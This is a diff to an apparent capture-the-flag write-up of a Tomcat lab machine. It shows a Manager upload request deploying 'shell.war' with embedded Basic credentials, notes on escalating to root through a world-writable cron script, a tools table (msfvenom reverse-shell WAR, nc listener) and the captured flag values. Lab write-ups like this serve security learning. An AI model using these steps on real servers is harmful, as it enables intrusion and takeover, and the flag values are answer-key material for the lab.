@@ -65,28 +65,14 @@ WAR uploaded through the Manager web interface. The request is a multipart POST 
 ```http
 POST /manager/html/upload;jsessionid=B7807BB4F00584EA67CD0772A1865481?org.apache.catalina.filters.CSRF_NONCE=393F7178AF96537CC7FA8A29DF3506D6 HTTP/1.1
 Host: thompson:8080
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:149.0) Gecko/20100101 Firefox/149.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Content-Type: multipart/form-data; boundary=----geckoformboundary34cf6c8f465489198b18752de0b88c57
-Content-Length: 1323
 Authorization: Basic dG9tY2F0OnMzY3JldA==
-Cookie: JSESSIONID=B7807BB4F00584EA67CD0772A1865481
-Referer: http://thompson:8080/manager/html
+Content-Type: multipart/form-data; boundary=----geckoformboundary34cf6c8f465489198b18752de0b88c57
 
 ------geckoformboundary34cf6c8f465489198b18752de0b88c57
 Content-Disposition: form-data; name="deployWar"; filename="shell.war"
 Content-Type: application/octet-stream
 
 .. snipped ..
-------geckoformboundary34cf6c8f465489198b18752de0b88c57--
-```
-
-```http
-HTTP/1.1 200
-Set-Cookie: JSESSIONID=EEDB733A5AA9CE5A7DE8A0D49D11BE2A;path=/manager;HttpOnly
-Content-Type: text/html;charset=utf-8
-Date: Wed, 15 Apr 2026 14:48:14 GMT
-Content-Length: 19893
 ```
 
 HTTP 200 — Manager reloads with the newly deployed `/shell` application listed.
@@ -256,3 +242,23 @@ cat /root/root.txt
 - World-writable scripts executed by root-owned cron jobs are an instant privilege escalation — `find / -writable -name "*.sh" 2>/dev/null` should be routine post-foothold
 - AJP on 8009 was present but unnecessary here; in other contexts (Ghostcat, CVE-2020-1938) it would be the primary attack vector
 - `watch -n 1 ls -lah /bin/bash` is a clean one-liner for confirming cron execution without spamming commands
+
+---
+
+## 🛠️ Tools Used
+
+| Tool | Purpose |
+| --- | --- |
+| `nmap` | Port and service enumeration |
+| `msfvenom` | Generate JSP reverse shell WAR file |
+| Burp Suite | Capture CSRF nonce and deploy WAR via Manager UI |
+| `nc` | Reverse shell listener |
+| `python3` | Shell stabilisation (pty.spawn) |
+| `watch` | Monitor SUID bit on /bin/bash after cron trigger |
+
+## 🚩 Flags
+
+| Flag | Value |
+| --- | --- |
+| `user.txt` | `39400c90bc683a41a8935e4719f181bf` |
+| `root.txt` | `d89d5391984c0450a95497153ae7ca3a` |
